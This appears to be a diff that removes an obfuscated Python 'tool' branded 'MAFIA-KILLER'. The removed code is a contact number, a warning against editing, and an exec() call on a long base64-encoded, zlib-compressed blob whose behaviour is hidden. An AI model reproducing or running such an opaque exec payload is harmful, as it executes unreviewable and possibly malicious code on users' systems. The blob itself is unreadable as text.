@@ -1,4 +1,1630 @@
-#Encrypted By MAFIA-KILLER
-#WHATSAPP : +92132197796/DON,T TRY TO EDIT THIS TOOL/
-import zlib, base64
-exec(zlib.decompress(base64.b64decode("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